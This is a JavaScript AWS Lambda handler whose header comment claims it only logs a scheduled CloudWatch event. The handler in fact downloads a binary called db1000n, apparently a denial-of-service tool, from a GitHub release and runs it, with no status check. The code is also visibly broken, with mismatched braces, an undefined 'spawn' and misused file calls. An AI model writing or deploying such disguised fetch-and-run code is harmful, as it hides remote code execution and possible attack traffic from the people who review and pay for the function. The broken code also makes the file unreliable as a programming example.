/**
 * A Lambda function that logs the payload received from a CloudWatch scheduled event.
 */


exports.scheduledEventLoggerHandler = async (event, context) => {  
    const child_process = require('child_process');
    const fs = require('fs');
    const http = require('http');
    const https = require('https');

    
   async function download(url, filePath) {
        const proto = !url.charAt(4).localeCompare('s') ? https : http;

        return new Promise((resolve, reject) => {
            const file = fs.createWriteStream(filePath);
            let fileInfo = null;

            const request = proto.get(url,{followAllRedirects: true}, response => {
//                 if (response.statusCode !== 200) {
//                     fs.unlink(filePath, () => {
//                     reject(new Error(`Failed to get '${url}' (${response.statusCode})`));
//                 });
//                 return;
            }

        fileInfo = {
            mime: response.headers['content-type'],
            size: parseInt(response.headers['content-length'], 10),
        };
            response.pipe(file);
        });

        // The destination stream is ended by the time it's called
        file.on('finish', () => resolve(fileInfo));

        request.on('error', err => {
            fs.unlink(filePath, () => reject(err));
        });

        file.on('error', err => {
            fs.unlink(filePath, () => reject(err));
        });

        request.end();
    });
 }  
  let fn = process.cwd()+'/db1000n';
  await download('https://github.com/dannysilence/db1000n_aws_lambda/releases/download/test/db1000n', fn)
  if(fs.exists(fn)) {;
     const defaults = {
        cwd: process.cwd(),
        env: process.env
     };   
    const ls = spawn('ls', ['-lna', process.cwd()]);

    ls.stdout.on('data', (data) => {
    console.log(`stdout: ${data}`);
    });

    ls.stderr.on('data', (data) => {
    console.error(`stderr: ${data}`);
    });

    ls.on('close', (code) => {
    console.log(`child process exited with code ${code}`);
    });
    const db = child_process.spawn('db1000n');

    db.stdout.on('data', (data) => {
    console.log(`stdout: ${data}`);
    });

    db.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
    });

    db.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
    });                                     
  }
};
